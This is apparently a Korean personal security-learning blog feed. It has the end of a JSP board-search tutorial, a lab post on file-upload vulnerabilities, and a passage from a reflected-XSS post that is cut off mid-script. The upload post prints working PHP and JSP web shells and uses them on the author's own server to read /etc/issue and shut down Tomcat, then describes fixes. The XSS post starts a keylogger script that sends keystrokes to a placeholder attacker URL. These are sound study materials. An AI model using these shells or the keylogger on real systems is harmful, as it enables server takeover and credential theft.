<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"OFFSET ? ROWS FETCH NEXT ? ROWS ONLY"</span><span class="o">);</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="n">from</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">4</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">5</span><span class="o">,</span> <span class="n">start</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">6</span><span class="o">,</span> <span class="n">number</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">from</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">4</span><span class="o">,</span> <span class="n">start</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">5</span><span class="o">,</span> <span class="n">number</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>쿼리문에 생성일 범위를 추가하여 특정 범위에 있는 게시글 수를 구한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getCount</span><span class="o">(</span><span class="kt">int</span> <span class="n">optionVal</span><span class="o">,</span> <span class="nc">String</span> <span class="n">question</span><span class="o">,</span> <span class="kt">long</span> <span class="n">from</span><span class="o">,</span> <span class="kt">long</span> <span class="n">to</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select count(sid) from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%' or main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">2</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (username like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">3</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"  and (gen_time &gt; ? and gen_time &lt; ?)"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">re</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="n">cnt</span><span class="o">,</span> <span class="n">from</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">cnt</span> <span class="o">+=</span><span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="n">cnt</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
</code></pre></div></div>

<h4 id="noticejava">Notice.java</h4>
<ul>
  <li>테이블에 저장된 생성시간(long)을 사람이 볼 수 있는 날짜로 변경한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Notice</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getGenDate</span><span class="o">(){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleDateFormat</span><span class="o">(</span><span class="s">"dd MMM yyy HH:mm"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">obj</span><span class="o">.</span><span class="na">setTimeZone</span><span class="o">(</span><span class="nc">TimeZone</span><span class="o">.</span><span class="na">getTimeZone</span><span class="o">(</span><span class="s">"Asia/Seoul"</span><span class="o">));</span> <span class="c1">// 타임존 한국</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">res</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Date</span><span class="o">(</span><span class="n">genTime</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">obj</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="n">res</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h3 id="결과-1">결과</h3>
<ul>
  <li>날짜 범위를 지정하고 검색하면 날짜 사이에 생성된 게시글 목록들을 볼 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/39d994ec-2892-4be4-97cd-57a93f070883" alt="Pasted image 20230602035208" /></li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://heum-story.tistory.com/74">JAVA Date 정규식 :: Simple Dev (tistory.com)</a></li>
  <li><a href="https://axce.tistory.com/31">HTML input 요소 :: 날짜, 시간 관련 입력 (tistory.com)</a></li>
  <li><a href="http://www.tcpschool.com/examples/tryit/tryhtml.php?filename=html_ref_tag_select_form_01">©TCP-tryWWW (tcpschool.com)</a></li>
  <li><a href="https://youngest-programming.tistory.com/101">자바 어떤 기기에서든 어디서든 한국의 날짜만 얻고 싶을 때 (tistory.com)</a></li>
  <li><a href="https://hianna.tistory.com/322">HTML콤보박스(select) (1) - 기본값 지정, 비활성화, 항목 비활성화 - 어제 오늘 내일 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="jsp" /><category term="servlet" /><category term="java" /><summary type="html"><![CDATA[게시글 검색 기능 및 날짜 지정 검색을 제작하여 보자.]]></summary></entry><entry><title type="html">File Upload 취약점 실습</title><link href="http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B51/" rel="alternate" type="text/html" title="File Upload 취약점 실습" /><published>2023-05-31T00:00:00+09:00</published><updated>2023-05-31T23:13:00+09:00</updated><id>http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B51</id><content type="html" xml:base="http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B51/"><![CDATA[<h2 id="file-upload-취약점이란">File Upload 취약점이란?</h2>
<ul>
  <li>파일 업로드 기능의 취약점을 이용하여 악의적인 파일(웹쉘)을 업로드한다. 이러한 업로드를 통해 서버의 시스템 권환을 장악할 수 있다.</li>
  <li>공격자가 악성 파일을 업로드하고 공격자가 url 링크를 통해 공격자가 올린 파일에 접속이 가능할 때 발생하는 공격법이다.</li>
  <li>웹 쉘 파일을 서버로 업로드하여 공격자는 시스템 내부의 명령을 수행할 수 있다.</li>
</ul>

<h2 id="취약점-발생-위치">취약점 발생 위치</h2>
<ul>
  <li>파일 업로드가 가능한 곳</li>
  <li>게시글<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4b77c359-86b1-455e-a7c2-015d229ab7bb" alt="Pasted image 20230531170442" /></li>
</ul>

<h2 id="웹-쉘">웹 쉘</h2>
<ul>
  <li>웹 서비스를 구동하기 위한 웹서버 환경에서 지원 가능한 웹 애플리케이션 언어를 기반으로 동작되는 파일을 의미한다.</li>
  <li>외부망에 있는 공격자가 시스템 내부 명령을 수행을 하기 위한 목적으로 사용된다.</li>
</ul>

<h3 id="php-스크립트-일-때">PHP 스크립트 일 때</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="jsp-스크립트-일-때">JSP 스크립트 일 때</h3>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
<span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">c</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">while</span><span class="o">((</span><span class="n">c</span><span class="o">=</span><span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">())!=-</span><span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">c</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
<span class="o">}</span>
<span class="nt">%&gt;</span>
</code></pre></div></div>

<h2 id="업로드-취약점-실습">업로드 취약점 실습</h2>
<ul>
  <li>직접 만든 웹 페이지의 업로드 부분의 취약점을 이용하여 실습하였다.</li>
</ul>

<h3 id="실습-서버-환경">실습 서버 환경</h3>
<ul>
  <li>nginx + tomcat ( WAS )</li>
</ul>

<h3 id="파일-업로드-위치-확인">파일 업로드 위치 확인</h3>
<ul>
  <li>게시글<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/20be9578-36d5-4089-b306-a7b0837fecda" alt="Pasted image 20230531170549" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/923dc625-df69-48c5-86fb-0ae5c29661ec" alt="Pasted image 20230531170615" /></li>
</ul>

<h3 id="웹-쉘-업로드-하기">웹 쉘 업로드 하기.</h3>
<ol>
  <li>웹 쉘 JSP 스크립트 작성하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c98cc8e-f4ee-4620-ab09-6eb6f8d91cb9" alt="Pasted image 20230531190315" /></li>
  <li>
    <p>파일 업로드를 위한 게시글 작성하기 및 저장하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/47f35ad0-7052-4aa5-b627-51f19181ab83" alt="Pasted image 20230531175551" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fcffc78a-c412-4b2b-b878-0089e3e2fec8" alt="Pasted image 20230531175622" /></p>
  </li>
  <li>게시글에서 파일이 잘 다운되는 것을 확인할 수 있다. 다운로드 요청 링크를 보면 get 요청의 파라미터로 파일이름과 폴더이름이 들어있는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/378b3221-c1e5-416f-ae9e-96be006e51e8" alt="Pasted image 20230531175720" /></li>
  <li>URL을 통해 업로드한 test.jsp에 접속해 보자.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/49deb562-3906-41a7-8b8f-7fdde07f1cfd" alt="Pasted image 20230531190443" /><br /><code class="language-plaintext highlighter-rouge">http://221.27.0.6/1685527431308_110/test.jsp</code></li>
  <li>아무런 파라미터를 안주면 null 오류가 발생한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/31367fa8-0ac0-4960-aff7-24d322e95e75" alt="Pasted image 20230531190604" /></li>
</ol>

<h3 id="명령어-입력하기">명령어 입력하기</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">http://사이트 주소/test.jsp?cmd=pwd</code> 를 통해 파일 목록을 나열할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c905b0f8-649d-4e2b-9b10-1a951a686513" alt="Pasted image 20230531201540" /></li>
  <li>서버 버전확인하기.<br /><code class="language-plaintext highlighter-rouge">http://사이트 주소/test.jsp?cmd=cat%20/etc/issue</code><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ed2a602a-008e-4a09-b54c-5cbcfce1b6d4" alt="Pasted image 20230531193854" /></li>
  <li>명령을 통해 웹 서버를 종료시켜 보자. 먼저 apache 서버인지 nginx 서버인지 확인하기.<br /><code class="language-plaintext highlighter-rouge">http://사이트 주소?cmd=service%20nginx%20status</code><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0cbadaee-ff57-4261-b49f-9fdf1c7518e3" alt="Pasted image 20230531203111" /></li>
  <li>nginx 서버인 것을 확인하였다. <code class="language-plaintext highlighter-rouge">service nginx stop</code> 명령을 통해 nginx 서버를 종료시켜 보자. nginx 서버를 멈추기 위해서는 관리자 권한이 필요하다. 따라서 nginx 서버를 종료하는 것은 어려워 보인다.</li>
  <li>톰캣 서버를 종료시켜보자. 먼저 <code class="language-plaintext highlighter-rouge">apache-tomcat-10.1.9/bin</code> 폴더에 <code class="language-plaintext highlighter-rouge">shutdown</code> 파일이 있다. 이 파일을 실행 시키면 톰캣 서버는 종료된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0ee94f88-316b-43c4-997d-175efca63c51" alt="Pasted image 20230531203806" /><br /><code class="language-plaintext highlighter-rouge">http://사이트 주소?cmd=./shutdown.sh</code></li>
  <li>톰캣 서버가 종료되었다는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d8f5b5ba-a42f-4acc-bc2d-92b2714c7557" alt="Pasted image 20230531203923" /></li>
</ol>

<h2 id="file-upload-취약점-대응방안">File Upload 취약점 대응방안</h2>
<ul>
  <li>파일 업로드 저장위치를 물리적으로 분리시켜주면 된다. 즉 웹 페이지가 저장되어 있는 서버와 파일이 저장되는 서버를 분리시켜주면 된다.</li>
  <li>파일 저장 위치를 웹 링크를 통해 접속할 수 없는 위치로 설정하여야 한다.</li>
  <li>웹 서버의 계정의 접근 권한을 제한하는 방법도 있다.</li>
</ul>

<h2 id="웹-페이지-파일-업로드-취약점-없애기">웹 페이지 파일 업로드 취약점 없애기</h2>
<ul>
  <li>파일 저장 위치를 웹 URL을 통해 접속할 수 없는 장소로 설정해 주었다. 이제 웹 URL로 접속할 수 없다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">String</span> <span class="nf">getFilePath</span><span class="o">(</span><span class="nc">ServletRequest</span> <span class="n">request</span><span class="o">,</span><span class="nc">String</span> <span class="n">folderName</span><span class="o">){</span>
	<span class="c1">// 업로드 폴더 존재 확인 업로드 폴더 존재안하면 만들어주기.</span>
	<span class="c1">// 링크를 통해 접근할 수 없는 위치에 만들어주기.</span>
	<span class="kt">var</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getRealPath</span><span class="o">(</span><span class="s">""</span><span class="o">)).</span><span class="na">getParentFile</span><span class="o">().</span><span class="na">getParent</span><span class="o">()+</span><span class="nc">File</span><span class="o">.</span><span class="na">separatorChar</span><span class="o">+</span><span class="s">"upload_folder"</span><span class="o">;</span>
	<span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
	<span class="k">if</span><span class="o">(!</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">folder</span><span class="o">.</span><span class="na">isDirectory</span><span class="o">()){</span>
		<span class="n">folder</span><span class="o">.</span><span class="na">mkdir</span><span class="o">();</span> <span class="c1">// 업로드 폴더 만들기.</span>
	<span class="o">}</span>
	<span class="n">path</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span> <span class="nc">File</span><span class="o">.</span><span class="na">separsatorChar</span> <span class="o">+</span> <span class="n">folderName</span><span class="o">;</span>
	<span class="k">return</span> <span class="n">path</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>웹 페이지에서 폴더 이름을 예측할 수 있는 가능성을 없애주었고, 게시글 번호 파라미터를 추가해주었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f378cdf7-9dea-4946-b584-1c4e3755fa9d" alt="Pasted image 20230531190443" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8b522229-9ed6-4601-95be-cd3675ba6a74" alt="Pasted image 20230531212208" /></li>
</ul>

<h2 id="후기">후기</h2>
<ul>
  <li>직접 웹 쉘을 작성하고 웹 서버에 업로드하여 외부에서 서버 명령어를 실행시켜 보았다. 처음에는 웹 쉘이 무엇인지 몰랐고 찾아보아도 이해가 잘안되었는데 직접 실습을 해보니 웹 쉘이 어떤것인지 감이 잡혔다. 서버에 접속하여 원하는 명령을 마음데로 실행 시켜보니 파일 업로드 취약점이 서버에 얼마나 위험한지 알 수 있었다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://haenny.tistory.com/266">윈도우 cmd 명령어 실행 : Java로 실행파일 실행시키기 응용 (tistory.com)</a></li>
  <li><a href="https://velog.io/@jsw4215/%EB%82%B4%EA%B0%80-%EB%A7%8C%EB%93%A0-%ED%99%88%ED%8E%98%EC%9D%B4%EC%A7%80-%ED%95%B4%ED%82%B9%ED%95%98%EA%B8%B04">내가 만든 홈페이지 해킹하기(4) (velog.io)</a></li>
  <li><a href="https://m.blog.naver.com/nahejae533/220997626311">File Upload 공격 : 네이버 블로그 (naver.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="File Upload" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[File Upload 에 대하여 알아보고 직접 웹 쉘을 업로드 해보자.]]></summary></entry><entry><title type="html">로그인 페이지 Reflected XSS 취약점</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/" rel="alternate" type="text/html" title="로그인 페이지 Reflected XSS 취약점" /><published>2023-05-30T00:00:00+09:00</published><updated>2023-05-30T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/"><![CDATA[<h2 id="취약점-발견-위치">취약점 발견 위치</h2>
<ul>
  <li>직접 만든 사이트의 로그인 페이지에서 XSS 취약점을 발견하였다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/af4d52b7-22d7-44fe-a78d-406421828678" alt="Pasted image 20230530184238" /></li>
</ul>

<h2 id="취약점-유형">취약점 유형</h2>
<ul>
  <li>Reflected XSS 취약점.</li>
  <li>POC 코드를 이용하여 alert 창이 출력되는 것을 확인하였다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/37c0fac8-7939-4a21-9069-94fcea7021e3" alt="Pasted image 20230530184503" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/82cea7f2-fa52-4ed0-a276-32627e9558ee" alt="Pasted image 20230530184521" /></li>
</ul>

<h2 id="공격-시나리오">공격 시나리오</h2>
<ol>
  <li>공격자가 키로거를 삽입한 로그인 링크를 만들어 사용자가 클릭하도록 유도한다.</li>
  <li>사용자가 공격자가 전달한 링크를 통해 로그인을 시도한다면 사용자의 입력 정보가 그대로 공격자 서버로 전송된다.</li>
  <li>공격자 서버에서 사용자가 입력한 정보를 그대로 확인할 수 있다.</li>
</ol>

<h2 id="공격-스크립트-작성">공격 스크립트 작성</h2>

<ul>
  <li>키로거 공격 스크립트</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">keys</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">hackURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">공격자 서버 주소?v=</span><span class="dl">"</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onkeydown</span><span class="o">=</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
	<span class="nx">key</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">?</span><span class="nx">e</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">:</span><span class="nx">e</span><span class="p">.</span><span class="nx">charCode</span><span class="p">;</span>
	<span class="nx">key</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
	<span class="nx">keys</span> <span class="o">+=</span> <span class="nx">key</span><span class="p">;</span>
	<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
<span class="p">};</span>
